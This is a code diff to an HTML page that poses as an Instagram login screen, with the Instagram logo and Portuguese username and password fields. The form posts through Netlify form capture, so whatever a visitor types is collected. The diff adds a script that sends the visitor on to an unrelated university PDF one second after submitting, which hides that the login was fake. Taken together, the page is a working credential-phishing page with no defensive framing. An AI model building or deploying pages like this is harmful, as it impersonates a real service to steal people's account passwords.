@@ -9,20 +9,26 @@
 <body>
     <div class="login-container">
         <img src="img/logoinsta.png" alt="logo instagram" class="logo">
-        <form class="login-form" name="contact" method="POST" netlify action="https://eadcampus.spo.ifsp.edu.br/pluginfile.php/313970/mod_page/content/67/guia_ifsp_ead_33-48.pdf">
+        <form class="login-form" name="contact" method="POST" netlify>
             <input type="text" name="username_email" placeholder="Usuario ou E-mail" autocomplete="off">
             <input type="password" name="password" placeholder="Senha" autocomplete="off">
-            <button type="submit">Logar</button>
+            <button type="submit" onclick="redirectToURL()">Logar</button>
             <div class="divider"></div>
             <div class="ou">OU</div>
             <a href="#">Esqueceu a senha?</a>
         </form>
-        
          
         
     </div>
 
-    
+    <script>
+        function redirectToURL() {
+            // Redireciona para a URL desejada após 1 segundo (1000 milissegundos)
+            setTimeout(function() {
+                window.location.href = "https://eadcampus.spo.ifsp.edu.br/pluginfile.php/313970/mod_page/content/67/guia_ifsp_ead_33-48.pdf";
+            }, 1000);
+        }
+    </script>
 
 </body>
 </html>
